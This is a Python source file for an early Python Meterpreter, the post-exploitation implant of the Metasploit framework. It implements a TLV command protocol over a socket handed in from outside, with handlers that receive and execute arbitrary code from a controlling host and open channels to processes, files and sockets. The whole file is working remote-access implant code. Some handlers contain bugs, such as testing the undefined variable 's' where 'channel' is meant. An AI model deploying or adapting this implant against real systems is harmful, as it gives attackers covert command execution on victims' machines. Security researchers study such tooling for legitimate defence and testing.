#!/usr/bin/python
import os
import sys
import code
import random
import ctypes
import select
import socket
import struct
import threading
import subprocess

has_windll = hasattr(ctypes, 'windll')

#
# Constants
#
PACKET_TYPE_REQUEST = 0
PACKET_TYPE_RESPONSE = 1
PACKET_TYPE_PLAIN_REQUEST = 10
PACKET_TYPE_PLAIN_RESPONSE = 11

ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1

CHANNEL_CLASS_BUFFERED = 0
CHANNEL_CLASS_STREAM = 1
CHANNEL_CLASS_DATAGRAM = 2
CHANNEL_CLASS_POOL = 3

#
# TLV Meta Types
#
TLV_META_TYPE_NONE =       (   0   )
TLV_META_TYPE_STRING =     (1 << 16)
TLV_META_TYPE_UINT =       (1 << 17)
TLV_META_TYPE_RAW =        (1 << 18)
TLV_META_TYPE_BOOL =       (1 << 19)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP =      (1 << 30)
TLV_META_TYPE_COMPLEX =    (1 << 31)
# not defined in original
TLV_META_TYPE_MASK =    (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)

#
# TLV base starting points
#
TLV_RESERVED =   0
TLV_EXTENSIONS = 20000
TLV_USER =       40000
TLV_TEMP =       60000

#
# TLV Specific Types
#
TLV_TYPE_ANY =                 TLV_META_TYPE_NONE   |   0
TLV_TYPE_METHOD =              TLV_META_TYPE_STRING |   1
TLV_TYPE_REQUEST_ID =          TLV_META_TYPE_STRING |   2
TLV_TYPE_EXCEPTION =           TLV_META_TYPE_GROUP  |   3
TLV_TYPE_RESULT =              TLV_META_TYPE_UINT   |   4

TLV_TYPE_STRING =              TLV_META_TYPE_STRING |  10
TLV_TYPE_UINT =                TLV_META_TYPE_UINT   |  11
TLV_TYPE_BOOL =                TLV_META_TYPE_BOOL   |  12

TLV_TYPE_LENGTH =              TLV_META_TYPE_UINT   |  25
TLV_TYPE_DATA =                TLV_META_TYPE_RAW    |  26
TLV_TYPE_FLAGS =               TLV_META_TYPE_UINT   |  27

TLV_TYPE_CHANNEL_ID =          TLV_META_TYPE_UINT   |  50
TLV_TYPE_CHANNEL_TYPE =        TLV_META_TYPE_STRING |  51
TLV_TYPE_CHANNEL_DATA =        TLV_META_TYPE_RAW    |  52
TLV_TYPE_CHANNEL_DATA_GROUP =  TLV_META_TYPE_GROUP  |  53
TLV_TYPE_CHANNEL_CLASS =       TLV_META_TYPE_UINT   |  54

TLV_TYPE_SEEK_WHENCE =         TLV_META_TYPE_UINT   |  70
TLV_TYPE_SEEK_OFFSET =         TLV_META_TYPE_UINT   |  71
TLV_TYPE_SEEK_POS =            TLV_META_TYPE_UINT   |  72

TLV_TYPE_EXCEPTION_CODE =      TLV_META_TYPE_UINT   | 300
TLV_TYPE_EXCEPTION_STRING =    TLV_META_TYPE_STRING | 301

TLV_TYPE_LIBRARY_PATH =        TLV_META_TYPE_STRING | 400
TLV_TYPE_TARGET_PATH =         TLV_META_TYPE_STRING | 401
TLV_TYPE_MIGRATE_PID =         TLV_META_TYPE_UINT   | 402
TLV_TYPE_MIGRATE_LEN =         TLV_META_TYPE_UINT   | 403

TLV_TYPE_CIPHER_NAME =         TLV_META_TYPE_STRING | 500
TLV_TYPE_CIPHER_PARAMETERS =   TLV_META_TYPE_GROUP  | 501

def generate_request_id():
	chars = 'abcdefghijklmnopqrstuvwxyz'
	return ''.join(random.choice(chars) for x in xrange(32))

def packet_get_tlv(pkt, tlv_type):
	offset = 0
	while (offset < len(pkt)):
		tlv = struct.unpack('>II', pkt[offset:offset+8])
		if (tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type:
			val = pkt[offset+8:(offset+8+(tlv[0] - 8))]
			if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
				val = val.split('\x00', 1)[0]
			elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
				val = struct.unpack('>I', val)[0]
			elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
				val = bool(struct.unpack('b', val)[0])
			elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
				pass
			return {'type':tlv[1], 'length':tlv[0], 'value':val}
		offset += tlv[0]
	return {}

def tlv_pack(*args):
	if len(args) == 2:
		tlv = {'type':args[0], 'value':args[1]}
	else:
		tlv = args[0]
	data = ""
	if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
		data = struct.pack('>II', 8 + len(tlv['value']) + 1, tlv['type']) + tlv['value'] + '\x00'
	elif (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
		data = struct.pack('>III', 12, tlv['type'], tlv['value'])
	elif (tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
		data = struct.pack('>II', 9, tlv['type']) + chr(int(bool(tlv['value'])))
	elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
		data = struct.pack('>II', 8 + len(tlv['value']), tlv['type']) + tlv['value']
	elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
		data = struct.pack('>II', 8 + len(tlv['value']), tlv['type']) + tlv['value']
	elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
		data = struct.pack('>II', 8 + len(tlv['value']), tlv['type']) + tlv['value']
	return data

class STDProcessBuffer(threading.Thread):
	def __init__(self, std, is_alive):
		threading.Thread.__init__(self)
		self.std = std
		self.is_alive = is_alive
		self.data = ''
		self.data_lock = threading.RLock()

	def run(self):
		while self.is_alive():
			byte = self.std.read(1)
			self.data_lock.acquire()
			self.data += byte
			self.data_lock.release()
		self.data_lock.acquire()
		self.data += self.std.read()
		self.data_lock.release()

	def is_read_ready(self):
		return len(self.data) != 0

	def read(self, l = None):
		data = ''
		self.data_lock.acquire()
		if l == None:
			data = self.data
			self.data = ''
		else:
			data = self.data[0:l]
			self.data = self.data[l:]
		self.data_lock.release()
		return data

class STDProcess(subprocess.Popen):
	def __init__(self, *args, **kwargs):
		subprocess.Popen.__init__(self, *args, **kwargs)
		self.stdout_reader = STDProcessBuffer(self.stdout, lambda: self.poll() == None)
		self.stdout_reader.start()
		self.stderr_reader = STDProcessBuffer(self.stderr, lambda: self.poll() == None)
		self.stderr_reader.start()

class PythonMeterpreter(object):
	def __init__(self, socket):
		self.socket = socket
		self.extension_functions = {}
		self.channels = {}
		self.interact_channels = []
		self.processes = {}
		for func in filter(lambda x: x.startswith('_core'), dir(self)):
			self.extension_functions[func[1:]] = getattr(self, func)
		self.running = True

	def register_function(self, func):
		self.extension_functions[func.__name__] = func

	def register_function_windll(self, func):
		if has_windll:
			self.register_function(func)

	def run(self):
		while self.running:
			if len(select.select([self.socket], [], [], 0)[0]):
				request = self.socket.recv(8)
				if len(request) != 8:
					break
				req_length, req_type = struct.unpack('>II', request)
				req_length -= 8
				request = ''
				while len(request) < req_length:
					request += self.socket.recv(4096)
				print('[+] received ' + str(len(request)) + ' bytes')
				response = self.create_response(request)
				self.socket.send(response)
				print('[+] sent ' + str(len(response)) + ' bytes')
			else:
				channels_for_removal = []
				channel_ids = self.channels.keys() # iterate over the keys because self.channels could be modified if one is closed
				for channel_id in channel_ids:
					channel = self.channels[channel_id]
					data = ''
					if isinstance(channel, STDProcess):
						if not channel_id in self.interact_channels:
							continue
						if channel.stdout_reader.is_read_ready():
							data = channel.stdout_reader.read()
						elif channel.stderr_reader.is_read_ready():
							data = channel.stderr_reader.read()
						elif channel.poll() != None:
							self.handle_dead_resource_channel(channel_id)
					elif isinstance(channel, socket._socketobject):
						while len(select.select([channel.fileno()], [], [], 0)[0]):
							try:
								d = channel.recv(1)
							except socket.error:
								d = ''
							if len(d) == 0:
								self.handle_dead_resource_channel(channel_id)
								break
							data += d
					if data:
						pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
						pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
						pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
						pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
						pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
						pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
						pkt  = struct.pack('>I', len(pkt) + 4) + pkt
						self.socket.send(pkt)
						print('[+] sent ' + str(len(pkt)) + ' bytes')

	def handle_dead_resource_channel(self, channel_id):
		del self.channels[channel_id]
		if channel_id in self.interact_channels:
			self.interact_channels.remove(channel_id)
		pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
		pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_close')
		pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
		pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
		pkt  = struct.pack('>I', len(pkt) + 4) + pkt
		self.socket.send(pkt)
		print('[+] sent ' + str(len(pkt)) + ' bytes')

	def _core_loadlib(self, request, response):
		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
		if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
			return ERROR_FAILURE
		preloadlib_methods = self.extension_functions.keys()
		i = code.InteractiveInterpreter({'meterpreter':self, 'packet_get_tlv':packet_get_tlv, 'tlv_pack':tlv_pack, 'STDProcess':STDProcess})
		i.runcode(compile(data_tlv['value'], '', 'exec'))
		postloadlib_methods = self.extension_functions.keys()
		new_methods = filter(lambda x: x not in preloadlib_methods, postloadlib_methods)
		for method in new_methods:
			response += tlv_pack(TLV_TYPE_METHOD, method)
		return ERROR_SUCCESS, response

	def _core_shutdown(self, request, response):
		response += tlv_pack(TLV_TYPE_BOOL, True)
		self.running = False
		return ERROR_SUCCESS, response

	def _core_channel_open(self, request, response):
		channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)
		handler = 'channel_create_' + channel_type['value']
		if handler not in self.extension_functions:
			return ERROR_FAILURE, response
		handler = self.extension_functions[handler]
		return handler(request, response)

	def _core_channel_close(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		if isinstance(channel, file):
			channel.close()
		elif isinstance(channel, subprocess.Popen):
			channel.kill()
		elif isinstance(s, socket._socketobject):
			channel.close()
		else:
			return ERROR_FAILURE, response
		del self.channels[channel_id]
		if channel_id in self.interact_channels:
			self.interact_channels.remove(channel_id)
		return ERROR_SUCCESS, response

	def _core_channel_eof(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		result = False
		if isinstance(channel, file):
			result = channel.tell() == os.fstat(channel.fileno()).st_size
		response += tlv_pack(TLV_TYPE_BOOL, result)
		return ERROR_SUCCESS, response

	def _core_channel_interact(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		toggle = packet_get_tlv(request, TLV_TYPE_BOOL)['value']
		if toggle:
			if channel_id in self.interact_channels:
				self.interact_channels.remove(channel_id)
			else:
				self.interact_channels.append(channel_id)
		elif channel_id in self.interact_channels:
			self.interact_channels.remove(channel_id)
		return ERROR_SUCCESS, response

	def _core_channel_read(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		if isinstance(channel, file):
			data = channel.read(length)
		elif isinstance(channel, STDProcess):
			if channel.poll() != None:
				self.handle_dead_resource_channel(channel_id)
			if channel.stdout_reader.is_read_ready():
				data = channel.stdout_reader.read(length)
		elif isinstance(s, socket._socketobject):
			data = channel.recv(length)
		else:
			return ERROR_FAILURE, response
		response += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
		return ERROR_SUCCESS, response

	def _core_channel_write(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
		length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		l = len(channel_data)
		if isinstance(channel, file):
			channel.write(channel_data)
		elif isinstance(channel, subprocess.Popen):
			if channel.poll() != None:
				self.handle_dead_resource_channel(channel_id)
				return ERROR_FAILURE, response
			channel.stdin.write(channel_data)
		elif isinstance(s, socket._socketobject):
			try:
				l = channel.send(channel_data)
			except socket.error:
				channel.close()
				self.handle_dead_resource_channel(channel_id)
				return ERROR_FAILURE, response
		else:
			return ERROR_FAILURE, response
		response += tlv_pack(TLV_TYPE_LENGTH, l)
		return ERROR_SUCCESS, response

	def create_response(self, request):
		resp = struct.pack('>I', PACKET_TYPE_RESPONSE)
		method_tlv = packet_get_tlv(request, TLV_TYPE_METHOD)
		resp += tlv_pack(method_tlv)

		reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
		resp += tlv_pack(reqid_tlv)

		print("[*] running method: " + method_tlv['value'])
		if method_tlv['value'] in self.extension_functions:
			handler = self.extension_functions[method_tlv['value']]
			try:
				result, resp = handler(request, resp)
			except Exception, err:
				print("[-] method: " + method_tlv['value'] + " encountered an exception: " + repr(err))
				result = ERROR_FAILURE
		else:
			result = ERROR_FAILURE
		if result == ERROR_FAILURE:
			print("[*] method: " + method_tlv['value'] + " failed")

		resp += tlv_pack(TLV_TYPE_RESULT, result)
		resp = struct.pack('>I', len(resp) + 4) + resp
		return resp
print("[+] starting meterpreter")
met = PythonMeterpreter(s)
met.run()
